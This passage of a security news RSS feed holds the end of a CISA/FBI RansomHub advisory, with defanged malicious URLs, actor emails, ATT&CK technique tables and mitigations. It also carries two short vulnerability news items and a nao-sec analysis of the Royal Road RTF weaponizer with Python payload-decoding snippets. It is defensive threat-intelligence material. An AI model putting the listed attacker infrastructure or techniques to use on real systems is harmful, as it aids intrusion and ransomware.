<td>http[:]//samuelelena[.]co/npm/module.external/jquery.min.js</td>
</tr>
<tr>
<td><a>https[:]//40031[.]co</a>/npm/module.tripadvisor/module.tripadvisor.css</td>
</tr>
<tr>
<td>https[:]//40031[.]co/npm/module.external/jquery.min.js</td>
</tr>
<tr>
<td>https[:]//40031[.]co/npm/module.external/moment.min.js</td>
</tr>
<tr>
<td>https[:]//40031[.]co/npm/module.external/client.min.js</td>
</tr>
<tr>
<td>https[:]//40031[.]co/npm/module.tripadvisor/module.tripadvisor.js</td>
</tr>
</tbody>
</table>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 5: Emails Related to RansomHub (2023-2024)</em></caption>
<thead>
<tr>
<th>Email Addresses</th>
</tr>
</thead>
<tbody>
<tr>
<td>brahma2023[@]onionmail.org</td>
</tr>
<tr>
<td>&lt;victim_organization_name&gt;[@]protonmail.com</td>
</tr>
</tbody>
</table>
<h2><strong>MITRE ATT&amp;CK Tactics and Techniques</strong></h2>
<p>See&nbsp;<strong>Table 6–Table 17&nbsp;</strong>for all referenced threat actor tactics and techniques in this advisory. For assistance with mapping malicious cyber activity to the MITRE ATT&amp;CK framework, see CISA and MITRE ATT&amp;CK’s <a href="https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping" title="Best Practices for MITRE ATT&amp;CK Mapping">Best Practices for MITRE ATT&amp;CK Mapping</a> and CISA’s <a href="https://github.com/cisagov/Decider/" title="cisagov / decider">Decider Tool</a>.</p>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 6: Resource Development</em></caption>
<thead>
<tr>
<th>Technique Title</th>
<th>ID</th>
<th>Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Obtain Capabilities: Exploits</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1588/005/" title="Obtain Capabilities: Exploits">T1588.005</a></td>
<td>RansomHub affiliates may buy, steal, or download exploits that can be used during targeting.</td>
</tr>
</tbody>
</table>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 7: Initial Access</em></caption>
<thead>
<tr>
<th>Technique Title</th>
<th>ID</th>
<th>Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Phishing</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1566/" title="Phishing">T1566</a></td>
<td>RansomHub affiliates used mass phishing and spear-phishing emails to obtain initial access.</td>
</tr>
<tr>
<td>Exploit Public-Facing Application</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1190/" title="Exploit Public-Facing Application">T1190</a></td>
<td>RansomHub affiliates may exploit known vulnerabilities to obtain initial access.</td>
</tr>
</tbody>
</table>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 8: Execution</em></caption>
<thead>
<tr>
<th>Technique Title</th>
<th>ID</th>
<th>Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Command and Scripting Interpreter</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1059/001/" title="Command and Scripting Interpreter">T1059.001</a></td>
<td>RansomHub affiliates used PowerShell and Scripts to quickly run and automate intrusion.</td>
</tr>
<tr>
<td>Windows Management Instrumentation</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1047/" title="Windows Management Instrumentation">T1047</a></td>
<td>RansomHub affiliates may abuse Windows Management Instrumentation to execute malicious commands and payloads.</td>
</tr>
</tbody>
</table>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 9: Persistence</em></caption>
<thead>
<tr>
<th>Technique Title&nbsp;</th>
<th>ID</th>
<th>Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Command and Scripting Interpreter</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1059/001/" title="Command and Scripting Interpreter">T1059.001</a></td>
<td>RansomHub affiliates used PowerShell and Scripts to quickly run and automate intrusion.</td>
</tr>
<tr>
<td>Create Account</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1136/" title="Create Account">T1136</a></td>
<td>RansomHub affiliates may create an account to maintain access to victim systems.</td>
</tr>
</tbody>
</table>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 10: Privilege Escalation</em></caption>
<thead>
<tr>
<th>Technique Title</th>
<th>ID</th>
<th>Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Account Manipulation</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1098/" title="Account Manipulation">T1098</a></td>
<td>RansomHub affiliates may manipulate accounts to maintain and/or elevate access to victim systems.</td>
</tr>
<tr>
<td>Remote Services: Remote Desktop Protocol</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1021/001/" title="Remote Services: Remote Desktop Protocol">T1021.001</a></td>
<td>RansomHub affiliates may log onto systems using the Remote Desk Protocol, then perform actions as the logged-on user.</td>
</tr>
</tbody>
</table>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 11: Defense Evasion</em></caption>
<thead>
<tr>
<th>Technique Title</th>
<th>ID</th>
<th>Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Masquerading</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1036/" title="Masquerading">T1036</a></td>
<td>RansomHub affiliates may hide binaries by renaming executable names.</td>
</tr>
<tr>
<td>Indicator Removal on Host</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1070/" title="Indicator Removal on Host">T1070</a></td>
<td>RansomHub affiliates may remove logs to inhibit cybersecurity response.</td>
</tr>
<tr>
<td>Impair Defenses: Disable or Modify Tools</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1562/001/" title="Impair Defenses: Disable or Modify Tools">T1562.001</a></td>
<td>RansomHub affiliates may disable endpoint detection and response (EDR) tooling to avoid detection.</td>
</tr>
</tbody>
</table>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 12: Credential Access</em></caption>
<thead>
<tr>
<th>Technique Title</th>
<th>ID</th>
<th>Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>OS Credential Dumping</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1003/" title="OS Credential Dumping">T1003</a></td>
<td>RansomHub affiliates used Mimikatz on Windows systems to gather credentials.</td>
</tr>
<tr>
<td>Brute Force: Password Spraying</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1110/003/" title="Brute Force: Password Spraying">T1110.003</a></td>
<td>RansomHub affiliates may use password spraying to obtain initial access.</td>
</tr>
</tbody>
</table>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 13: Discovery</em></caption>
<thead>
<tr>
<th>Technique Title</th>
<th>ID</th>
<th>Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Remote System Discovery</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1018/" title="Remote System Discovery">T1018</a></td>
<td>RansomHub affiliates may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system.&nbsp;</td>
</tr>
<tr>
<td>Network Service Discovery</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1046/" title="Network Service Discovery">T1046</a></td>
<td>RansomHub affiliates may attempt to get a listing of services running on remote hosts and local network infrastructure devices,</td>
</tr>
</tbody>
</table>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 14: Lateral Movement</em></caption>
<thead>
<tr>
<th>Technique Title</th>
<th>ID</th>
<th>Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Exploitation of Remote Services</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1210/" title="Exploitation of Remote Services">T1210</a></td>
<td>RansomHub affiliates may exploit remote service to gain unauthorized access to internal systems once inside of a network.&nbsp;</td>
</tr>
</tbody>
</table>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 15: Command and Control</em></caption>
<thead>
<tr>
<th>Technique Title</th>
<th>ID</th>
<th>Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Remote Access Software</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1219/" title="Remote Access Software">T1219</a></td>
<td>RansomHub affiliates may use Anydesk, a legitimate desktop support and remote access software to establish an interactive command and control channel to target systems within networks.</td>
</tr>
</tbody>
</table>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 16: Exfiltration</em></caption>
<thead>
<tr>
<th>Technique Title</th>
<th>ID</th>
<th>Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1048/002/" title="Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol">T1048.002</a></td>
<td>RansomHub affiliates may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel.</td>
</tr>
<tr>
<td>Transfer Data to Cloud Account</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1537/" title="Transfer Data to Cloud Account">T1537</a></td>
<td>RansomHub affiliates may exfiltrate data by transferring the data, including through sharing/syncing and creating backups of cloud environments, to another cloud account they control on the same service.</td>
</tr>
<tr>
<td>Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Unencrypted Non-C2 Protocol</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1048/003/" title="Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Unencrypted Non-C2 Protocol">T1048.003</a></td>
<td>RansomHub affiliates may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel.</td>
</tr>
</tbody>
</table>
<div>
<table class="tablesaw tablesaw-stack">
<caption><em>Table 17: Impact</em></caption>
<thead>
<tr>
<th>Technique Title</th>
<th>ID</th>
<th>Use</th>
</tr>
</thead>
<tbody>
<tr>
<td>Data Encrypted for Impact</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1486/" title="Data Encrypted for Impact">T1486</a></td>
<td>RansomHub affiliates used encryption for ransomware operations.</td>
</tr>
<tr>
<td>Inhibit System Recovery</td>
<td><a href="https://attack.mitre.org/versions/v15/techniques/T1490/" title="Inhibit System Recovery">T1490</a></td>
<td>RansomHub ransomware deleted volume shadow copies and affiliates removed backups for ransomware operations.</td>
</tr>
</tbody>
</table>
<h2><strong>Incident Response</strong></h2>
<p>If compromise is detected, organizations should:</p>
<ol>
<li>Quarantine or take potentially affected hosts offline.</li>
<li>Reimage compromised hosts.</li>
<li>Provision new account credentials.</li>
<li>Collect and review artifacts such as running processes/services, unusual authentications, and recent network connections.</li>
<li>Report the compromise to CISA via CISA’s 24/7 Operations Center (<a href="mailto:report@cisa.gov" title="Report to CISA">report@cisa.gov</a> or 888-282-0870). State, local, tribal, or territorial government entities can also report to the Multi-State Information Sharing and Analysis Center (MS-ISAC) (<a href="mailto:SOC@cisecurity.org" title="Report to MS-ISAC">SOC@cisecurity.org</a> or 866-787-4722).</li>
</ol>
<h2><strong>Mitigations</strong></h2>
<h3>Network Defenders</h3>
<p>The authoring organizations recommend organizations implement the mitigations below to improve cybersecurity posture based on RansomHub’s activity. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s <a href="https://www.cisa.gov/cross-sector-cybersecurity-performance-goals" title="Cross-Sector Cybersecurity Performance Goals">Cross-Sector Cybersecurity Performance Goals</a> for more information on the CPGs, including additional recommended baseline protections.</p>
<ul>
<li><strong>Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud).</strong></li>
<li><strong>Require all accounts with password logins</strong> <strong>(e.g., service accounts, admin accounts, and domain admin accounts) to comply with&nbsp;</strong><a href="https://pages.nist.gov/800-63-3/" title="Digital Identity Guidelines">National Institute for Standards and Technology (NIST) standards</a><strong> for developing and managing password policies.</strong>
<ul>
<li>Use longer passwords consisting of at least 8 characters and no more than 64 characters in length;</li>
<li>Store passwords in hashed format using industry-recognized password managers;</li>
<li>Add password user “salts” to shared login credentials;</li>
<li>Avoid reusing passwords;</li>
<li>Implement multiple failed login attempt account lockouts;</li>
<li>Disable password “hints”; and</li>
<li>Refrain from requiring password changes more frequently than once per year.<br /><strong>Note:</strong> NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets. Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher.</li>
<li>Require administrator credentials to install software.</li>
</ul>
</li>
<li><strong>Keep all operating systems, software, and firmware up to date</strong> [<a href="https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#MitigatingKnownVulnerabilities1E)" title="Mitigating Known Vulnerabilities (1.E)">CPG 1.E</a>]. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Prioritize patching known exploited vulnerabilities in internet-facing systems.</li>
<li><strong>Require Phishing-Resistant multifactor authentication to administrator accounts</strong> [<a href="https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#PhishingResistantMultifactorAuthenticationMFA2H" title="Phishing-Resistant Multifactor Authentication (MFA) (2.H)">CPG 2.H</a>] and require standard MFA for all services to the extent possible (particularly for webmail, virtual private networks, and accounts that access critical systems).</li>
<li><strong>Segment networks</strong> [<a href="https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#NetworkSegmentation2F" title="Network Segmentation (2.F)">CPG 2.F</a>] to prevent the spread of ransomware. Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement.</li>
<li><strong>Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool</strong> [<a href="https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DetectingRelevantThreatsandTTPs3A" title="Detecting Relevant Threats and TTPs (3.A)">CPG 3.A</a>]. To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network. Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.</li>
<li><strong>Install, regularly update, and enable real time detection for antivirus</strong> <strong>software on all hosts.</strong></li>
<li><strong>Implement Secure Logging Collection and Storage Practices&nbsp;</strong>[<a href="https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#LogCollection2T" title="Log Collection (2.T)">CPG 2.T</a>].<strong>&nbsp;</strong>Learn more about logging best practices by referencing <a href="https://www.cisa.gov/resources-tools/services/logging-made-easy" title="Logging Made Easy">CISA’s Logging Made Easy</a> resources.</li>
<li><strong>Review domain controllers, servers, workstations, and active directories</strong> for new and/or unrecognized accounts.</li>
<li><strong>Audit user accounts</strong> with administrative privileges and configure access controls according to the principle of least privilege.</li>
<li><strong>Disable unused ports.</strong></li>
<li><strong>Implement and enforce email security policies</strong> [<a href="https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#EmailSecurity2M" title="Email Security (2.M)">CPG 2.M</a>].</li>
<li><strong>Disable macros by default</strong> [<a href="https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#DisableMacrosbyDefault2N" title="Disable Macros by Default (2.N)">CPG 2.N</a>].</li>
<li><strong>Consider adding an email banner to emails</strong> received from outside your organization.</li>
<li><strong>Disable hyperlinks in received emails.</strong></li>
<li><strong>Implement time-based access for accounts set at the admin level and higher.</strong> For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model). This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need. Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task.</li>
<li><strong>Disable command-line and scripting activities and permissions.</strong> Privilege escalation and lateral movement often depend on software utilities running from the command line. If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally.</li>
<li><strong>Maintain offline backups of data, and regularly maintain backup and restoration</strong> [<a href="https://www.cisa.gov/cross-sector-cybersecurity-performance-goals#MitigatingKnownVulnerabilities1E" title="System Backups (2.R)">CPG 2.R</a>]. By instituting this practice, the organization ensures they will not be severely interrupted, and/or only have irretrievable data.</li>
<li><strong>Ensure all backup data is encrypted,</strong> immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure.</li>
</ul>
<h3>Software Manufacturers</h3>
<p>The above mitigations apply to enterprises and critical infrastructure organizations with on-premises or hybrid environments. Recognizing that insecure software is the root cause of many of these flaws and that the responsibility should not be on the end user, CISA urges software manufacturers to implement the following to reduce the prevalence of identified or exploited issues (e.g., misconfigurations, weak passwords, and other weaknesses identified and exploited through the assessment team):</p>
<ul>
<li><strong>Embed security into product architecture</strong> throughout the entire software development lifecycle (SDLC).</li>
<li><strong>Mandate MFA, ideally phishing-resistant MFA, for privileged users</strong> and make MFA a default, rather than opt-in, feature.</li>
</ul>
<p>These mitigations align with tactics provided in the joint guide <a href="https://www.cisa.gov/resources-tools/resources/secure-by-design" title="Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software">Shifting the Balance of Cybersecurity Risk: Principles and Approaches for Secure by Design Software</a>. CISA urges software manufacturers to take ownership of improving the security outcomes of their customers by applying these and other secure by design tactics. By using secure by design tactics, software manufacturers can make their product lines secure “out of the box” without requiring customers to spend additional resources making configuration changes, purchasing security software and logs, monitoring, and making routine updates.</p>
<p>For more information on secure by design, see CISA’s <a href="https://www.cisa.gov/securebydesign" title="Secure by Design">Secure by Design</a> webpage.</p>
<h2><strong>Validate Security Controls</strong></h2>
<p>In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization’s security program against the threat behaviors mapped to the MITRE ATT&amp;CK for Enterprise framework in this advisory. The authoring organizations recommend testing your existing security controls inventory to assess how they perform against the ATT&amp;CK techniques described in this advisory.</p>
<p>To get started:</p>
<ol>
<li>Select an ATT&amp;CK technique described in this advisory (see<strong>&nbsp;Table 6–Table 17</strong>).</li>
<li>Align your security technologies against the technique.</li>
<li>Test your technologies against the technique.</li>
<li>Analyze your detection and prevention technologies’ performance.</li>
<li>Repeat the process for all security technologies to obtain a set of comprehensive performance data.</li>
<li>Tune your security program, including people, processes, and technologies, based on the data generated by this process.</li>
</ol>
<p>CISA, FBI, MS-ISAC, and HHS recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&amp;CK techniques identified in this advisory.</p>
<h2><strong>Resources</strong></h2>
<ul>
<li>#<a href="https://www.stopransomware.gov/">StopRansomware</a> is a whole-of-government approach that gives one central location for ransomware resources and alerts.</li>
<li>Resource to reduce the risk of a ransomware attack: <a href="https://www.cisa.gov/resources-tools/resources/stopransomware-guide">#StopRansomware Guide</a>.</li>
<li>No-cost cyber hygiene services: <a href="https://www.cisa.gov/cyber-hygiene-services">Cyber Hygiene Services</a> and <a href="https://github.com/cisagov/cset/releases/tag/v10.3.0.0">Ransomware Readiness Assessment</a>.</li>
<li>Health and Human Services <a href="https://hhscyber.hhs.gov/">HPH Cybersecurity Gateway</a> hosts the HPH CPGs and links to HHS cybersecurity resources.</li>
</ul>
<h2><strong>References</strong></h2>
<ol>
<li><a href="https://www.fortinet.com/blog/threat-research/ransomware-roundup-knight" title="Ransomware Roundup - Knight">Ransomware Roundup - Knight | FortiGuard Labs (fortinet.com)</a></li>
<li><a href="https://redskyalliance.org/xindustry/knight-ransomware" title="Knight Ransomware">Knight Ransomware - X-Industry - Red Sky Alliance</a></li>
<li><a href="https://www.uptycs.com/blog/threat-research-report-team/cyclops-ransomware-stealer-combo" title="Exploring a Dual Threat: Cyclops Ransomware &amp; Stealer Combo">Cyclops Ransomware and Stealer Combo: Exploring a Dual Threat (uptycs.com)</a></li>
<li><a href="https://www.bleepingcomputer.com/news/security/knight-ransomware-distributed-in-fake-tripadvisor-complaint-emails/" title="Knight ransomware distributed in fake Tripadvisor complaint emails">Knight ransomware distributed in fake Tripadvisor complaint emails (bleepingcomputer.com)</a></li>
</ol>
<h2><strong>Reporting</strong></h2>
<p>Your organization has no obligation to respond or provide information to the FBI in response to this joint advisory. If, after reviewing the information provided, your organization decides to provide information to the FBI, reporting must be consistent with applicable state and federal laws.</p>
<p>The FBI is interested in any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with threat actors, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file.</p>
<p>Additional details of interest include a targeted company point of contact, status and scope of infection, estimated loss, operational impact, transaction IDs, date of infection, date detected, initial attack vector, and host- and network-based indicators.</p>
<p>The authoring organizations do not encourage paying a ransom, as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to the FBI’s <a href="https://www.ic3.gov/Home/ComplaintChoice" title="Internet Crime Complain Center (IC3)">Internet Crime Complain Center (IC3)</a>, a <a href="https://www.fbi.gov/contact-us/field-offices" title="Field Offices">local FBI Field Office</a>, or CISA via the agency’s <a href="https://www.cisa.gov/report" title="Report to CISA">Incident Reporting System</a> or its 24/7 Operations Center (<a href="mailto:report@cisa.gov)" title="Report to CISA">report@cisa.gov</a>) or by calling 1-844-Say-CISA (1-844-729-2472).</p>
<h2><strong>Disclaimer</strong></h2>
<p>The information in this report is being provided “as is” for informational purposes only. The authoring organizations do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by the authoring organizations.</p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
]]></content:encoded>
<pubDate>Thu, 29 Aug 24 12:00:00 +0000</pubDate>
</item>
<item>
<title>PoC Exploit for Zero-Click Vulnerability Made Available to the Masses</title>
<link>https://www.darkreading.com/vulnerabilities-threats/poc-exploit-for-zero-click-vulnerability-made-available-to-the-masses</link>
<guid>https://www.darkreading.com/vulnerabilities-threats/poc-exploit-for-zero-click-vulnerability-made-available-to-the-masses</guid>
<content:encoded><![CDATA[
The exploit can be accessed on GitHub and makes it easier for the flaw to be exploited by threat actors.
]]></content:encoded>
<pubDate>Tue, 27 Aug 2024 20:56:41 GMT</pubDate>
</item>
<item>
<title>A Vulnerability in GitHub Enterprise Server (GHES) Could Allow for Authentication Bypass</title>
<link>https://www.cisecurity.org/advisory/a-vulnerability-in-github-enterprise-server-ghes-could-allow-for-authentication-bypass_2024-060</link>
<guid>https://www.cisecurity.org/advisory/a-vulnerability-in-github-enterprise-server-ghes-could-allow-for-authentication-bypass_2024-060</guid>
<content:encoded><![CDATA[
<p>A vulnerability has been discovered in GitHub Enterprise Server (GHES), which could allow for authentication bypass. GHES is a popular platform for software developers. Organizations can build and store software applications using Git version control and automate deployment pipelines. Successful exploitation of this vulnerability could allow for an attacker to forge a SAML response to provision and/or gain access to a user with site administrator privileges. An attacker could then view, change, or delete data; or create new accounts with full user rights.</p>
]]></content:encoded>
<pubDate>Thu, 23 May 2024 16:45:55 -0400</pubDate>
</item>
<item>
<title>Royal Road! Re:Dive</title>
<link>http://nao-sec.org/2021/01/royal-road-redive.html</link>
<guid>http://nao-sec.org/2021/01/royal-road-redive.html</guid>
<content:encoded><![CDATA[
<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/00.png" /></p>

<h2 id="abstract">Abstract</h2>
<p>We introduced the “Royal Road RTF Weaponizer” in our previous blog [1] (and presented at Japan Security Analyst Conference 2020 and CPX 360 CPRCon 2020). Royal Road is a tool shared by many targeted attack groups believed to belong to China. It’s been a year since our previous blog, and Royal Road is still in use. Here, we will introduce the Royal Road-related attacks observed during 2020.</p>

<h2 id="previous-blog">Previous Blog</h2>
<p>Let’s briefly review the previous blog. Royal Road is a tool that generates RTF files that exploit the Microsoft Office Equation Editor vulnerabilities (CVE-2017-11882, CVE-2018-0798, CVE-2018-0802). The details of the tool are unknown, but the RTF file generated by it has various characteristics. The definition of “RTF file generated by Royal Road” may vary from researcher to researcher. Therefore, we define a file that meets the following conditions as an “RTF file generated by Royal Road”.</p>

<ol>
  <li>Exploiting a vulnerability in Microsoft Office Equation Editor</li>
  <li>Containing an object named “8.t”</li>
</ol>

<p>However, some RTF files are likely to be related to Royal Road, even though they don’t meet the second condition. For classification purposes, we refer to this as “Related Samples”. In reality, this may also be an RTF file generated by Royal Road, but the truth is only known to the attacker. Due to the our research, we have divided these into “Royal Road Samples” and “Related Samples”. However, they are treated the same in the specific case studies below.</p>

<p>And Royal Road is shared among various attack groups believed to belong to China. Specifically, it is believed to be used by the following attack groups. The attack group alias is written for reference. Strictly speaking, these can be different. For example, TA428 and Pirate Panda are not exactly equivalent.</p>

<ol>
  <li>Temp.Tick (BRONZE BUTLER, RedBaldKnight)</li>
  <li>Temp.Conimes (Goblin Panda, Cycldek)</li>
  <li>Temp.Periscope (Leviathan, APT40)</li>
  <li>Temp.Trident (Dagger Panda, IceFog)</li>
  <li>Tonto (Karma Panda, CactusPete, LoneRanger)</li>
  <li>TA428 (Pirate Panda)</li>
  <li>Rancor</li>
</ol>

<p>Also, we categorized the various characteristics of the RTF files used by these groups and showed what they have in common.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/01.png" /></p>

<h2 id="updates">Updates</h2>
<p>It’s been a year since we introduced Royal Road. In the meantime, the RTF file, believed to have been generated by Royal Road, has been used many times in targeted attacks, and several updates have been observed. First of all, we will introduce the updates.</p>

<p>The RTF file generated by Royal Road contains encoded malware. It is decoded by Shellcode after exploit. In our previous blog, we introduced the following 5 encodings.</p>

<ol>
  <li>4D 5A 90 00  (not encoded)</li>
  <li>F2 A3 20 72</li>
  <li>B2 A6 6D FF</li>
  <li>B0 74 77 46</li>
  <li>B2 5A 6F 00</li>
</ol>

<p>Many of the RTF files we observed in 2020 used the 3rd and 4th encodings. However, a few samples used the new encodings. The following 2 encodings.</p>

<ol>
  <li>A9 A4 6E FE</li>
</ol>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/02.png" /></p>

<p>This encoding can be decoded with code like the following:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">dec_data</span> <span class="o">=</span> <span class="p">[]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">enc_data</span><span class="p">)):</span>
    <span class="n">dec_data</span><span class="p">.</span><span class="n">append</span><span class="p">(((</span><span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">enc_data</span><span class="p">[</span><span class="n">i</span><span class="p">],</span>  <span class="s">"little"</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x7b</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x7b</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span><span class="p">)</span>
</code></pre></div></div>

<ol>
  <li>94 5F DA D8</li>
</ol>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/03.png" /></p>

<p>This encoding can be decoded with code like the following:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">dec_data</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">xor_key</span> <span class="o">=</span> <span class="mi">1387678300</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">enc_data</span><span class="p">)):</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
        <span class="n">x0</span> <span class="o">=</span> <span class="p">(</span><span class="n">xor_key</span> <span class="o">&amp;</span> <span class="mh">0x20000000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x20000000</span>
        <span class="n">x1</span> <span class="o">=</span> <span class="p">(</span><span class="n">xor_key</span> <span class="o">&amp;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="mi">8</span>
        <span class="n">x2</span> <span class="o">=</span> <span class="n">xor_key</span> <span class="o">&amp;</span> <span class="mi">1</span>
        <span class="n">x3</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">+</span> <span class="p">(</span><span class="n">x0</span> <span class="o">^</span> <span class="n">x1</span> <span class="o">^</span> <span class="n">x2</span><span class="p">)</span>
        <span class="n">xor_key</span> <span class="o">=</span> <span class="p">(</span><span class="n">xor_key</span> <span class="o">+</span> <span class="n">xor_key</span><span class="p">)</span> <span class="o">+</span> <span class="n">x3</span>
    <span class="n">dec_data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">enc_data</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="s">"little"</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">xor_key</span> <span class="o">%</span> <span class="mi">256</span><span class="p">))</span>
</code></pre></div></div>

<p>Our tool for decrypting Royal Road encoded object is already available on GitHub. It also supports the above new encodings.</p>

<p><a href="https://github.com/nao-sec/rr_decoder">https://github.com/nao-sec/rr_decoder</a></p>

<h2 id="new-attack-groups">New Attack Groups</h2>
<p>As we mentioned earlier, several attack groups use Royal Road. The following eight attack groups have been observed to use Royal Road (including both Royal Road Samples and Related Samples) during 2020.</p>

<ol>
  <li>Temp.Conimes</li>
  <li>Tonto</li>
  <li>TA428</li>
  <li>Naikon</li>
  <li>Higaisa</li>
  <li>Vicious Panda</li>
  <li>FunnyDream</li>
  <li>TA410</li>
</ol>

